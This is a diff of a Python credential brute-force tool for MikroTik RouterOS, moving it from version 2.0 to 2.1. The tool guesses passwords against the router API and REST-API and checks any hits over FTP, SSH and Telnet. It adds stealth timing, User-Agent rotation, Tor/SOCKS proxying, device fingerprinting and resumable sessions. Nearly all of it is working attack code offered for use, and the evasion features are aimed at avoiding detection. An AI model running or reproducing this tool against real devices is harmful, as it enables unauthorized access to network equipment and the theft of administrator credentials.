@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # Author: Andre Henrique (LinkedIn: https://www.linkedin.com/in/mrhenrike | X: @mrhenrike)
 
-_version = "2.0"
+_version = "2.1"
 
 # Check if python version is between 3.8.x until 3.12.x
 import sys
@@ -36,11 +36,7 @@ elif current_version > MAX_PYTHON:
         print("\n[INFO] Non-interactive mode detected, continuing with Python 3.13+...")
         response = "y"
 
-# This module provides a brute-force attack tool for Mikrotik RouterOS API and REST-API
-# It allows users to test credentials against the API and validate post-login access to services like FTP, SSH, and TELNET.
-# It includes a simple logging system with color-coded output for terminal
-# It respects verbosity flags: normal, verbose, and very verbose (debug)
-#
+# Enhanced imports for v2.1
 import time, argparse, threading, concurrent.futures, socket, urllib3, warnings, requests
 from datetime import datetime
 from pathlib import Path
@@ -61,16 +57,28 @@ try:
 except ModuleNotFoundError:
     raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found.")
 
-# Import new modules (v2.0)
+# Import new v2.1 modules
 try:
     from _export import ResultExporter
     from _progress import ProgressBar
     from _proxy import ProxyManager
+    from _stealth import StealthManager
+    from _fingerprint import MikrotikFingerprinter
+    from _wordlists import SmartWordlistManager
+    from _reports import PentestReportGenerator
+    from _cli import PentestCLI
+    from _session import SessionManager
 except ModuleNotFoundError as e:
-    print(f"[WARN] Some v2.0 modules not available: {e}")
+    print(f"[WARN] Some v2.1 modules not available: {e}")
     ResultExporter = None
     ProgressBar = None
     ProxyManager = None
+    StealthManager = None
+    MikrotikFingerprinter = None
+    SmartWordlistManager = None
+    PentestReportGenerator = None
+    PentestCLI = None
+    SessionManager = None
 
 # Check if the required modules are available
 def current_time():
@@ -94,45 +102,52 @@ def test_restapi_login(host, username, password, port, use_ssl=False):
     except Exception:
         return False
 
-# Function to check service ports
-def check_service_ports(target, api_port, http_port, ssl_port, validate_services, use_ssl, log):
-    log.info(f"[CHECK] Testing API port {api_port}...")
-    api_open = is_port_open(target, api_port)
-    log.info(f"[CHECK] Testing HTTP port {http_port}...")
-    http_open = is_port_open(target, http_port)
-    
-    services_ok = {
-        "api": api_open,
-        "http": http_open
-    }
+# Function to test FTP login
+def test_ftp_login(host, username, password, port=21):
+    try:
+        import ftplib
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=5)
+        ftp.login(username, password)
+        ftp.quit()
+        return True
+    except Exception:
+        return False
 
-    if use_ssl:
-        services_ok["ssl"] = is_port_open(target, ssl_port)
-        services_ok["restapi"] = is_port_open(target, ssl_port if use_ssl else http_port)
+# Function to test SSH login
+def test_ssh_login(host, username, password, port=22):
+    try:
+        import paramiko
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(host, port=port, username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False)
+        ssh.close()
+        return True
+    except Exception:
+        return False
 
-    for svc in ["ftp", "ssh", "telnet"]:
-        if svc in validate_services:
-            port = validate_services.get(svc) or {"ftp": 21, "ssh": 22, "telnet": 23}[svc]
-            services_ok[svc] = is_port_open(target, port)
+# Function to test Telnet login
+def test_telnet_login(host, username, password, port=23):
+    try:
+        import telnetlib  # type: ignore
+        tn = telnetlib.Telnet(host, port, timeout=5)
+        tn.read_until(b"Login:", timeout=5)
+        tn.write(username.encode('ascii') + b"\n")
+        tn.read_until(b"Password:", timeout=5)
+        tn.write(password.encode('ascii') + b"\n")
+        result = tn.read_some()
+        tn.close()
+        # Check if login was successful (no "Login:" prompt in response)
+        return b"Login:" not in result and b"incorrect" not in result.lower()
+    except Exception:
+        return False
 
-    if not services_ok["http"]:
-        log.warning(f"[CHECK] HTTP port ({http_port}) is closed. REST-API tests will be skipped.")
+# Web Console testing removed - WebFig returns 406 error for all requests
+# making it impossible to test authentication properly
 
-    if not services_ok["api"]:
-        log.warning(f"[CHECK] API port ({api_port}) is closed. API tests will be skipped.")
-
-    if use_ssl and not services_ok.get("ssl"):
-        log.warning(f"[CHECK] SSL port ({ssl_port}) is closed. Ignoring tests with SSL.")
-
-    for svc in ["ftp", "ssh", "telnet"]:
-        if svc in validate_services and not services_ok.get(svc, True):
-            log.warning(f"[CHECK] Service port {svc.upper()} is closed. Ignoring validation.")
-
-    return services_ok
-
-# === Class for Brute Force Attack ===
-class Bruteforce:
-    def __init__(self, target, usernames, passwords, combo_dict, delay, api_port=8728, rest_port=8729, http_port=80, use_ssl=False, ssl_port=443, max_workers=2, verbose=False, verbose_all=False, validate_services=None, services_ok=None, show_progress=False, proxy_url=None, export_formats=None, export_dir="results", max_retries=1):
+# Enhanced Bruteforce class with v2.1 features
+class EnhancedBruteforce:
+    def __init__(self, target, usernames, passwords, combo_dict, delay, api_port=8728, rest_port=8729, http_port=80, use_ssl=False, ssl_port=443, max_workers=2, verbose=False, verbose_all=False, validate_services=None, services_ok=None, show_progress=False, proxy_url=None, export_formats=None, export_dir="results", max_retries=1, stealth_mode=True, fingerprint=True, session_manager=None, resume_session=False, force_new_session=False):
         self.target = target
         self.api_port = api_port
         self.rest_port = rest_port
@@ -155,13 +170,27 @@ class Bruteforce:
         self.index_lock = threading.Lock()
         self.index = 0
         
-        # v2.0 features
+        # v2.1 features
         self.show_progress = show_progress
         self.progress_bar = None
         self.proxy_manager = None
         self.export_formats = export_formats or []
         self.export_dir = export_dir
         self.max_retries = max_retries
+        self.stealth_mode = stealth_mode
+        self.fingerprint = fingerprint
+        
+        # Session management
+        self.session_manager = session_manager
+        self.resume_session = resume_session
+        self.force_new_session = force_new_session
+        self.session_id = None
+        self.session_data = None
+        
+        # Initialize v2.1 modules
+        self.stealth_manager = StealthManager(enabled=stealth_mode) if StealthManager else None
+        self.fingerprinter = MikrotikFingerprinter() if MikrotikFingerprinter else None
+        self.wordlist_manager = SmartWordlistManager() if SmartWordlistManager else None
         
         # Setup proxy if provided
         if proxy_url and ProxyManager:
@@ -174,14 +203,61 @@ class Bruteforce:
         
         self.load_wordlist()
 
-    # Load wordlist from file or generate based on provided usernames and passwords
+    def _get_default_port(self, service_name):
+        """Get default port for a service."""
+        default_ports = {
+            'ftp': 21,
+            'ssh': 22,
+            'telnet': 23
+        }
+        return default_ports.get(service_name.lower(), 80)
+
     def load_file(self, path):
         with open(path, 'r', encoding='utf-8') as f:
             return [line.strip() for line in f if line.strip()]
 
-    # Load wordlist based on the provided parameters
     def load_wordlist(self):
         try:
+            # Check for existing session first
+            if self.session_manager and not self.force_new_session:
+                services_list = list(self.validate_services.keys()) if self.validate_services else ['api']
+                existing_session = self.session_manager.find_existing_session(
+                    self.target, services_list, []
+                )
+                
+                if existing_session and self.resume_session:
+                    if self.session_manager.should_resume(existing_session):
+                        self.log.info(f"[SESSION] Resuming session {existing_session['session_id']}")
+                        self.session_id = existing_session['session_id']
+                        self.session_data = existing_session
+                        
+                        # Load wordlist from session
+                        self.wordlist = []
+                        for combo in existing_session.get('wordlist', []):
+                            if isinstance(combo, list) and len(combo) == 2:
+                                self.wordlist.append(tuple(combo))
+                        
+                        # Set starting index from session
+                        self.index = existing_session.get('tested_combinations', 0)
+                        
+                        # Load successful credentials
+                        self.successes = existing_session.get('successful_credentials', [])
+                        
+                        self.log.info(f"[SESSION] Resuming from {self.index}/{len(self.wordlist)} combinations")
+                        return
+                    elif existing_session.get('status') == 'completed':
+                        self.log.info(f"[SESSION] Session already completed for {self.target}")
+                        self.log.info(f"[SESSION] Found {len(existing_session.get('successful_credentials', []))} successful credentials")
+                        
+                        # Show results from completed session
+                        for cred in existing_session.get('successful_credentials', []):
+                            self.log.success(f"[SESSION] {cred.get('user')}:{cred.get('pass')} on {cred.get('services', [])}")
+                        
+                        # Exit if session is completed
+                        self.wordlist = []
+                        return
+            
+            # Load wordlist normally
             if self.combo_dict:
                 self.wordlist = [tuple(line.split(':')) for line in self.load_file(self.combo_dict) if ':' in line]
             elif self.usernames and self.passwords:
@@ -209,8 +285,24 @@ class Bruteforce:
             self.log.error(f"Error loading wordlist: {e}")
             exit(1)
         self.wordlist = list(dict.fromkeys(self.wordlist))
+        
+        # Create new session if session manager is available
+        if self.session_manager and not self.session_id:
+            services_list = list(self.validate_services.keys()) if self.validate_services else ['api']
+            config = {
+                'api_port': self.api_port,
+                'http_port': self.http_port,
+                'ssl_port': self.ssl_port,
+                'use_ssl': self.use_ssl,
+                'max_workers': self.max_workers,
+                'delay': self.delay,
+                'stealth_mode': self.stealth_mode
+            }
+            self.session_id = self.session_manager.create_session(
+                self.target, services_list, self.wordlist, config
+            )
+            self.log.info(f"[SESSION] Created new session: {self.session_id}")
 
-    # Get the next combination of username and password
     def get_next_combo(self):
         with self.index_lock:
             if self.index >= len(self.wordlist):
@@ -219,13 +311,19 @@ class Bruteforce:
             self.index += 1
             return combo
 
-    # Worker function for each thread
     def worker(self):
+        thread_id = threading.get_ident()
         while True:
             combo = self.get_next_combo()
             if combo is None:
                 break
             user, password = combo
+
+            # Apply stealth delay if enabled
+            if self.stealth_manager:
+                self.stealth_manager.apply_stealth_for_thread(thread_id, self.delay)
+            else:
+                time.sleep(self.delay)
 
             # Always show what we're testing (but only first few if not verbose)
             if self.verbose or self.verbose_all:
@@ -248,13 +346,6 @@ class Bruteforce:
                 except Exception as e:
                     if self.verbose or self.verbose_all:
                         self.log.warning(f"[API] Connection error: {str(e)[:100]}")
-                    # Count connection errors
-                    if not hasattr(self, 'error_count'):
-                        self.error_count = 0
-                    self.error_count += 1
-            else:
-                if self.verbose_all:
-                    self.log.debug("[SKIP] API test skipped due to port check.")
 
             # === Test REST ===
             if self.services_ok.get("http") or (self.use_ssl and self.services_ok.get("ssl")):
@@ -272,22 +363,46 @@ class Bruteforce:
                         self.log.success(f"[REST] {user}:{password}")
                     elif self.verbose or self.verbose_all:
                         self.log.fail(f"[REST] {user}:{password}")
-                except requests.exceptions.HTTPError as http_err:
-                    if http_err.response.status_code == 401 and "api" in services:
-                        self.log.warning(f"[REST] Unauthorized for {user}:{password} — Hint: check if 'api' policy is enabled")
-                    elif self.verbose_all:
-                        self.log.warning(f"[REST] HTTP error for {user}:{password} — {http_err}")
                 except Exception as e:
                     if self.verbose_all:
                         self.log.warning(f"[REST] error for {user}:{password} — {e}")
-            else:
-                if self.verbose_all:
-                    self.log.debug("[SKIP] REST-API test skipped due to port check.")
+
+            # === Post-login Service Validation ===
+            if services and self.validate_services:
+                self.log.info(f"[VALIDATION] Testing post-login services for {user}:{password}")
+                validation_services = []
+                
+                for service_name, custom_port in self.validate_services.items():
+                    try:
+                        service_port = custom_port if custom_port else self._get_default_port(service_name)
+                        validation_result = False
+                        
+                        if service_name.lower() == 'ftp':
+                            validation_result = test_ftp_login(self.target, user, password, service_port)
+                        elif service_name.lower() == 'ssh':
+                            validation_result = test_ssh_login(self.target, user, password, service_port)
+                        elif service_name.lower() == 'telnet':
+                            validation_result = test_telnet_login(self.target, user, password, service_port)
+                        # Web Console testing removed - not reliable
+                        
+                        if validation_result:
+                            validation_services.append(service_name)
+                            self.log.success(f"[VALIDATION] {service_name.upper()} login successful for {user}:{password}")
+                        else:
+                            self.log.fail(f"[VALIDATION] {service_name.upper()} login failed for {user}:{password}")
+                            
+                    except Exception as e:
+                        self.log.warning(f"[VALIDATION] Error testing {service_name}: {e}")
+                
+                # Add validation services to the services list
+                if validation_services:
+                    services.extend(validation_services)
+                    self.log.success(f"[VALIDATION] Post-login validation successful: {', '.join(validation_services)}")
 
             # === Add valid credential ===
             if services:
                 with self.lock:
-                    self.successes.append({"user": user, "pass": password, "services": services})
+                    self.successes.append({"user": user, "pass": password, "services": services, "target": self.target})
                     # Update progress bar with success
                     if self.progress_bar:
                         self.progress_bar.update(1, success=True)
@@ -295,96 +410,21 @@ class Bruteforce:
                 # Update progress bar without success
                 if self.progress_bar:
                     self.progress_bar.update(1, success=False)
+            
+            # Update session progress every 10 attempts or on success
+            if self.session_manager and self.session_id and (self.index % 10 == 0 or services):
+                self.session_manager.update_session(
+                    self.session_id, 
+                    self.index, 
+                    self.successes, 
+                    [],  # failed_combinations - not tracking for now
+                    combo
+                )
 
-            time.sleep(self.delay)
-
-    # === Print progress ===
-    def validate_extra_services(self):
-        from ftplib import FTP
-        import telnetlib
-        import paramiko
-
-        for cred in self.successes:
-            user = cred["user"]
-            passwd = cred["pass"]
-            validated = []
-
-            # === FTP ===
-            if "ftp" in self.validate_services and self.services_ok.get("ftp", False):
-                port = self.validate_services.get("ftp") or 21
-                try:
-                    if self.verbose_all:
-                        self.log.debug(f"Testing FTP for {user}:{passwd} on port {port}")
-                    ftp = FTP()
-                    ftp.connect(self.target, port, timeout=5)
-                    ftp.login(user, passwd)
-                    validated.append("ftp")
-                    ftp.quit()
-                except Exception as e:
-                    if self.verbose_all:
-                        self.log.debug(f"FTP failed for {user}:{passwd} — {e}")
-            elif "ftp" in self.validate_services and self.verbose_all:
-                self.log.debug(f"[SKIP] FTP test skipped due to port check.")
-
-            # === SSH ===
-            if "ssh" in self.validate_services and self.services_ok.get("ssh", False):
-                port = self.validate_services.get("ssh") or 22
-                try:
-                    if self.verbose_all:
-                        self.log.debug(f"Testing SSH for {user}:{passwd} on port {port}")
-                    client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    client.connect(self.target, port=port, username=user, password=passwd, timeout=5)
-                    validated.append("ssh")
-                    client.close()
-                except Exception as e:
-                    if self.verbose_all:
-                        self.log.debug(f"SSH failed for {user}:{passwd} — {e}")
-            elif "ssh" in self.validate_services and self.verbose_all:
-                self.log.debug(f"[SKIP] SSH test skipped due to port check.")
-
-            # === TELNET ===
-            if "telnet" in self.validate_services and self.services_ok.get("telnet", False):
-                port = self.validate_services.get("telnet") or 23
-                try:
-                    if self.verbose_all:
-                        self.log.debug(f"Testing TELNET for {user}:{passwd} on port {port}")
-                    tn = telnetlib.Telnet(self.target, port, timeout=5)
-                    tn.read_until(b"login: ", timeout=5)
-                    tn.write(user.encode('ascii') + b"\n")
-                    tn.read_until(b"Password: ", timeout=5)
-                    tn.write(passwd.encode('ascii') + b"\n")
-
-                    idx, match, _ = tn.expect([
-                        b"incorrect", b">", b"#", br"$"
-                    ], timeout=5)
-                    tn.close()
-
-                    if idx in [1, 2, 3]:  # prompt shell
-                        validated.append("telnet")
-                        if self.verbose_all:
-                            self.log.debug(f"TELNET login success for {user}:{passwd}")
-                    elif idx == 0:
-                        matched_text = match.group().decode(errors="ignore")
-                        self.log.debug(f"TELNET failed for {user}:{passwd} — matched: {matched_text.strip()}")
-                    else:
-                        validated.append("telnet")
-                        self.log.debug(f"TELNET login assumed valid for {user}:{passwd} — no known prompt matched")
-                except Exception as e:
-                    if self.verbose_all:
-                        self.log.debug(f"TELNET exception for {user}:{passwd} on port {port} — {e}")
-            elif "telnet" in self.validate_services and self.verbose_all:
-                self.log.debug(f"[SKIP] TELNET test skipped due to port check.")
-
-            # === Add services validations ===
-            if validated:
-                cred["services"].extend(s for s in validated if s not in cred["services"])
-
-    # === Main function to run the brute force attack ===
     def run(self):
         # Show attack configuration
         print("\n" + "="*60)
-        print("ATTACK CONFIGURATION")
+        print("ENHANCED ATTACK CONFIGURATION v2.1")
         print("="*60)
         print(f"Target         : {self.target}")
         print(f"API Port       : {self.api_port}")
@@ -394,6 +434,8 @@ class Bruteforce:
         print(f"Delay          : {self.delay}s between attempts")
         print(f"Total Attempts : {len(self.wordlist)}")
         print(f"Max Retries    : {self.max_retries}")
+        print(f"Stealth Mode   : {'ON' if self.stealth_mode else 'OFF'}")
+        print(f"Fingerprinting : {'ON' if self.fingerprint else 'OFF'}")
         if self.proxy_manager:
             print(f"Proxy          : Enabled")
         if self.validate_services:
@@ -407,7 +449,16 @@ class Bruteforce:
             self.log.info("[PROXY] Setting up proxy connection...")
             self.proxy_manager.setup_socket()
         
-        self.log.info("[*] Starting brute force attack...")
+        # Fingerprint target if enabled
+        if self.fingerprint and self.fingerprinter:
+            self.log.info("[FINGERPRINT] Analyzing target...")
+            fingerprint_info = self.fingerprinter.fingerprint_device(self.target)
+            if fingerprint_info.get('is_mikrotik'):
+                self.log.success(f"[FINGERPRINT] Confirmed Mikrotik device (Risk: {fingerprint_info.get('risk_score', 0):.1f}/10)")
+            else:
+                self.log.warning("[FINGERPRINT] Target may not be a Mikrotik device")
+        
+        self.log.info("[*] Starting enhanced brute force attack...")
         self.log.info(f"[*] Testing {len(self.wordlist)} credential combinations...")
 
         # Initialize progress bar if requested
@@ -428,21 +479,23 @@ class Bruteforce:
 
         # Show attack statistics
         print("\n" + "="*60)
-        print("ATTACK STATISTICS")
+        print("ENHANCED ATTACK STATISTICS v2.1")
         print("="*60)
         print(f"Total Tested    : {len(self.wordlist)}")
         print(f"Successful      : {len(self.successes)}")
         print(f"Failed          : {len(self.wordlist) - len(self.successes)}")
         print(f"Success Rate    : {(len(self.successes)/len(self.wordlist)*100) if self.wordlist else 0:.1f}%")
+        if self.stealth_manager:
+            stealth_stats = self.stealth_manager.get_global_stats()
+            print(f"Stealth Events  : {stealth_stats.get('total_threads', 0)}")
         print("="*60 + "\n")
         
-        self.log.info("[*] Attack finished.\n")
+        # Update session with final results
+        if self.session_manager and self.session_id:
+            self.session_manager.complete_session(self.session_id, self.successes, "completed")
+            self.log.info(f"[SESSION] Session {self.session_id} completed")
 
-        # === Post-login validation ===
-        if self.validate_services and self.successes:
-            services_list = ', '.join(s.upper() for s in self.validate_services.keys())
-            self.log.info(f"[*] Initiating post-login validation for: {services_list}")
-            self.validate_extra_services()
+        self.log.info("[*] Enhanced attack finished.\n")
 
         # === Print results ===
         if self.successes:
@@ -458,9 +511,9 @@ class Bruteforce:
                 services = ', '.join(d["services"])
                 print(f"{idx:03} | {d['user']:<22} | {d['pass']:<22} | {services}")
             print(f"{'-'*80}")
-            print("\nAttack completed successfully.\n")
+            print("\nEnhanced attack completed successfully.\n")
             
-            # === Export results (v2.0) ===
+            # === Export results (v2.1) ===
             if self.export_formats and ResultExporter:
                 self.log.info("[*] Exporting results...")
                 exporter = ResultExporter(deduped, self.target, output_dir=self.export_dir)
@@ -483,60 +536,23 @@ class Bruteforce:
             print("="*60)
             print("No valid credentials were discovered.")
             print(f"Total attempts: {len(self.wordlist)}")
-            
-            # Show common issues
-            if hasattr(self, 'error_count') and self.error_count > 0:
-                print(f"\n⚠ Warning: {self.error_count} connection errors occurred")
-                print("Possible causes:")
-                print("  - Target is unreachable or offline")
-                print("  - Firewall blocking connections")
-                print("  - Wrong port number")
-                print("  - Target is not a Mikrotik device")
-                print("\nTroubleshooting:")
-                print(f"  1. Verify target is reachable: ping {self.target}")
-                print(f"  2. Check if API port is open: telnet {self.target} {self.api_port}")
-                print("  3. Try with verbose mode: -vv")
-            
             print("="*60 + "\n")
-            
-            # === Export results even when no credentials found (v2.0) ===
-            if self.export_formats and ResultExporter:
-                self.log.info("[*] Exporting results...")
-                exporter = ResultExporter([], self.target, output_dir=self.export_dir)
-                
-                for fmt in self.export_formats:
-                    if fmt == 'json':
-                        f = exporter.export_json()
-                        self.log.info(f"[*] Exported JSON: {f}")
-                    elif fmt == 'csv':
-                        f = exporter.export_csv()
-                        self.log.info(f"[*] Exported CSV: {f}")
-                    elif fmt == 'xml':
-                        f = exporter.export_xml()
-                        self.log.info(f"[*] Exported XML: {f}")
-                    elif fmt == 'txt':
-                        f = exporter.export_txt()
-                        self.log.info(f"[*] Exported TXT: {f}")
 
 # === CLI Entrypoint ===
-# This is the main entry point for the script. It sets up the command-line interface (CLI) using argparse.
-# It defines the arguments that can be passed to the script, including target IP, username/password lists, timing options, and validation services.
-# It also handles the parsing of these arguments and initializes the brute-force attack process.
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser(
         description="""
-    Mikrotik RouterOS API Brute Force Tool
-    --------------------------------------
-    Perform brute-force attacks against Mikrotik RouterOS API and REST-API services.
-    Optionally validate post-auth access to services like FTP, SSH, and TELNET.
+    Enhanced Mikrotik RouterOS API Brute Force Tool v2.1
+    --------------------------------------------------
+    Perform enhanced brute-force attacks against Mikrotik RouterOS API and REST-API services.
+    Features: Stealth Mode, Advanced Fingerprinting, Smart Wordlists, Professional Reports.
 
     Quick examples:
-        python mikrotikapi-bf.py -t 192.168.0.1 -U admin -P 123456
-        python mikrotikapi-bf.py -t 192.168.0.1 -u users.txt -p passwords.txt
-        python mikrotikapi-bf.py -t 192.168.0.1 -d combos.txt
-        python mikrotikapi-bf.py -t 192.168.0.1 -d combos.txt --validate ftp,ssh=2222,telnet
-        python mikrotikapi-bf.py -t 192.168.0.1 -d combos.txt --ssl --ssl-port 443
+        python mikrotikapi-bf-v2.1.py -t 192.168.0.1 -U admin -P 123456
+        python mikrotikapi-bf-v2.1.py -t 192.168.0.1 -u wordlists/labs_users.lst -p wordlists/labs_passwords.lst
+        python mikrotikapi-bf-v2.1.py -t 192.168.0.1 -d wordlists/labs_mikrotik_pass.lst --stealth
+        python mikrotikapi-bf-v2.1.py --interactive
 
     Verbosity modes:
         -v   Basic output with progress and results
@@ -546,7 +562,7 @@ if __name__ == "__main__":
     )
 
     # === Target ===
-    parser.add_argument("-t", "--target", required=True, help="Target IP address or hostname of Mikrotik device")
+    parser.add_argument("-t", "--target", help="Target IP address or hostname of Mikrotik device")
 
     # === Credentials ===
     parser.add_argument("-U", "--user", default="admin", help="Single username (default: admin)")
@@ -569,25 +585,121 @@ if __name__ == "__main__":
     # === Post-login Service Validation ===
     parser.add_argument("--validate", help=(
         "Comma-separated list of services to validate after login. "
-        "Supports optional custom ports: ftp, ssh, telnet (e.g., ftp=2121,ssh=2222)"
+        "Supports: ftp, ssh, telnet with optional custom ports (e.g., ftp=2121,ssh=2222)"
     ))
 
     # === Output and Debug ===
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output with failed attempts")
     parser.add_argument("-vv", "--verbose-all", action="store_true", help="Enable full debug output")
 
-    # === New v2.0 Features ===
+    # === New v2.1 Features ===
     parser.add_argument("--progress", action="store_true", help="Show progress bar with ETA")
     parser.add_argument("--proxy", help="Proxy URL (e.g., socks5://127.0.0.1:9050)")
     parser.add_argument("--export", help="Export formats: json, csv, xml, txt (comma-separated)")
     parser.add_argument("--export-all", action="store_true", help="Export to all formats (JSON, CSV, XML, TXT)")
     parser.add_argument("--export-dir", default="results", help="Export directory (default: results)")
     parser.add_argument("--max-retries", type=int, default=1, help="Max retry attempts on connection failure")
+    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (Fibonacci delays, User-Agent rotation)")
+    parser.add_argument("--fingerprint", action="store_true", help="Enable advanced fingerprinting")
+    parser.add_argument("--interactive", action="store_true", help="Start interactive CLI mode")
+    parser.add_argument("--resume", action="store_true", help="Resume from previous session if available")
+    parser.add_argument("--force", action="store_true", help="Force new session, ignore existing sessions")
+    parser.add_argument("--session-info", action="store_true", help="Show session information and exit")
+    parser.add_argument("--list-sessions", action="store_true", help="List all available sessions")
 
     args = parser.parse_args()
 
+    # Show banner
     Log.banner(version=_version)
 
+    # Session management
+    session_manager = SessionManager() if SessionManager else None
+    
+    # List sessions command
+    if args.list_sessions and session_manager:
+        sessions = session_manager.list_sessions()
+        if not sessions:
+            print("\n[INFO] No sessions found.")
+        else:
+            print(f"\n[INFO] Found {len(sessions)} session(s):")
+            print(f"{'ID':<12} | {'Target':<15} | {'Status':<10} | {'Progress':<8} | {'Success':<7} | {'Last Update'}")
+            print("-" * 80)
+            for session in sessions:
+                progress = f"{session.get('current_progress', 0):.1f}%"
+                success = len(session.get('successful_credentials', []))
+                last_update = session.get('last_update', session.get('start_time', ''))[:16]
+                print(f"{session.get('session_id', 'N/A'):<12} | {session.get('target', 'N/A'):<15} | {session.get('status', 'N/A'):<10} | {progress:<8} | {success:<7} | {last_update}")
+        sys.exit(0)
+    
+    # Session info command
+    if args.session_info and session_manager and args.target:
+        existing_session = session_manager.find_existing_session(
+            args.target, 
+            args.validate.split(',') if args.validate else ['api'],
+            []  # Will be filled with actual wordlist later
+        )
+        if existing_session:
+            stats = session_manager.get_session_stats(existing_session['session_id'])
+            print(f"\n[SESSION INFO]")
+            print(f"Session ID: {stats['session_id']}")
+            print(f"Target: {stats['target']}")
+            print(f"Status: {stats['status']}")
+            print(f"Progress: {stats['progress']:.1f}% ({stats['tested']}/{stats['total']})")
+            print(f"Successful: {stats['successful']}")
+            if stats['average_time']:
+                print(f"Avg time/attempt: {stats['average_time']:.2f}s")
+            if stats['estimated_completion']:
+                print(f"ETA: {session_manager.format_time_estimate(existing_session)}")
+        else:
+            print(f"\n[INFO] No existing session found for target {args.target}")
+        sys.exit(0)
+
+    # Interactive mode
+    if args.interactive:
+        if PentestCLI:
+            cli = PentestCLI()
+            cli.start()
+        else:
+            print("[ERROR] Interactive CLI not available. Missing _cli.py module.")
+        sys.exit(0)
+
+    # Check if target is provided for non-interactive mode
+    if not args.target:
+        print("[ERROR] Target is required for non-interactive mode.")
+        print("Use --interactive for CLI mode or provide -t <target>")
+        sys.exit(1)
+
+    log = Log(verbose=args.verbose, verbose_all=args.verbose_all)
+
+    # Check if ports are open
+    print("\n" + "="*60)
+    print("CHECKING TARGET SERVICES")
+    print("="*60)
+    print(f"Target: {args.target}")
+    print("Scanning ports...")
+    
+    services_ok = {
+        "api": is_port_open(args.target, args.api_port),
+        "http": is_port_open(args.target, args.http_port),
+        "ssl": is_port_open(args.target, args.ssl_port) if args.ssl else False
+    }
+    
+    # Show results
+    print("\nPort Scan Results:")
+    print(f"  API ({args.api_port}):  {'[OK] OPEN' if services_ok.get('api') else '[FAIL] CLOSED/FILTERED'}")
+    print(f"  HTTP ({args.http_port}): {'[OK] OPEN' if services_ok.get('http') else '[FAIL] CLOSED/FILTERED'}")
+    if args.ssl:
+        print(f"  SSL ({args.ssl_port}):  {'[OK] OPEN' if services_ok.get('ssl') else '[FAIL] CLOSED/FILTERED'}")
+    print("="*60)
+
+    # Parse export formats
+    export_formats = []
+    if args.export_all:
+        export_formats = ['json', 'csv', 'xml', 'txt']
+    elif args.export:
+        export_formats = [fmt.strip().lower() for fmt in args.export.split(',')]
+
+    # Parse validate services
     def parse_validate_services(raw_input):
         services = {}
         if not raw_input:
@@ -606,43 +718,8 @@ if __name__ == "__main__":
     usernames = args.userlist if args.userlist else args.user
     passwords = args.passlist if args.passlist else args.passw
     
-    # Parse export formats
-    export_formats = []
-    if args.export_all:
-        export_formats = ['json', 'csv', 'xml', 'txt']
-    elif args.export:
-        export_formats = [fmt.strip().lower() for fmt in args.export.split(',')]
-
-    # Check if the target is provided
-    log = Log(verbose=args.verbose, verbose_all=args.verbose_all)
-
-    # Check if ports are open
-    print("\n" + "="*60)
-    print("CHECKING TARGET SERVICES")
-    print("="*60)
-    print(f"Target: {args.target}")
-    print("Scanning ports...")
-    
-    services_ok = check_service_ports(
-        target=args.target,
-        api_port=args.api_port,
-        http_port=args.http_port,
-        ssl_port=args.ssl_port,
-        validate_services=service_ports,
-        use_ssl=args.ssl,
-        log=log
-    )
-    
-    # Show results
-    print("\nPort Scan Results:")
-    print(f"  API ({args.api_port}):  {'[OK] OPEN' if services_ok.get('api') else '[FAIL] CLOSED/FILTERED'}")
-    print(f"  HTTP ({args.http_port}): {'[OK] OPEN' if services_ok.get('http') else '[FAIL] CLOSED/FILTERED'}")
-    if args.ssl:
-        print(f"  SSL ({args.ssl_port}):  {'[OK] OPEN' if services_ok.get('ssl') else '[FAIL] CLOSED/FILTERED'}")
-    print("="*60)
-
-    # Instancia brute
-    bf = Bruteforce(
+    # Enhanced Bruteforce instance
+    bf = EnhancedBruteforce(
         target=args.target,
         api_port=args.api_port,
         rest_port=args.rest_port,
@@ -661,7 +738,12 @@ if __name__ == "__main__":
         proxy_url=args.proxy,
         export_formats=export_formats,
         export_dir=args.export_dir,
-        max_retries=args.max_retries
+        max_retries=args.max_retries,
+        stealth_mode=args.stealth,
+        fingerprint=args.fingerprint,
+        session_manager=session_manager,
+        resume_session=args.resume,
+        force_new_session=args.force
     )
 
     # Set the services_ok attribute
@@ -678,33 +760,3 @@ if __name__ == "__main__":
             import traceback
             traceback.print_exc()
         print("\nIf this is a bug, please report at: https://github.com/mrhenrike/MikrotikAPI-BF/issues\n")
-
-    def format_status(status):
-        return {
-            True: "OK",
-            False: "ERROR",
-            None: "NOT TESTED"
-        }.get(status, "UNKNOWN")
-
-    def format_port_checked(port, default, status):
-        if status is True:
-            return str(port if port is not None else default)
-        elif status is False:
-            return str(port)
-        return "N/A"
-
-    # === SERVICE SUMMARY ===
-    print("## SERVICE SUMMARY ##")
-    print(f"{'-'*40}")
-    print(f"ORD | {'SERVICE':<8} | PORT  | STATUS")
-    print(f"{'-'*40}")
-    print(f" 1  | {'API':<8} | {format_port_checked(args.api_port, 8728, services_ok.get('api')):<5} | {format_status(services_ok.get('api'))}")
-    print(f" 2  | {'HTTP':<8} | {format_port_checked(args.http_port, 80, services_ok.get('http')):<5} | {format_status(services_ok.get('http'))}")
-    print(f" 3  | {'SSL':<8} | {format_port_checked(args.ssl_port, 443, services_ok.get('ssl')):<5} | {format_status(services_ok.get('ssl'))}")
-    print(f" 4  | {'REST':<8} | {format_port_checked(args.rest_port, 8729, services_ok.get('restapi')):<5} | {format_status(services_ok.get('restapi'))}")
-    print(f" 5  | {'HTTPS':<8} | {format_port_checked(args.ssl_port, 443, services_ok.get('restapi')):<5} | {format_status(services_ok.get('restapi'))}")
-    print(f" 6  | {'FTP':<8} | {format_port_checked(service_ports.get('ftp'), 21, services_ok.get('ftp')):<5} | {format_status(services_ok.get('ftp'))}")
-    print(f" 7  | {'TELNET':<8} | {format_port_checked(service_ports.get('telnet'), 23, services_ok.get('telnet')):<5} | {format_status(services_ok.get('telnet'))}")
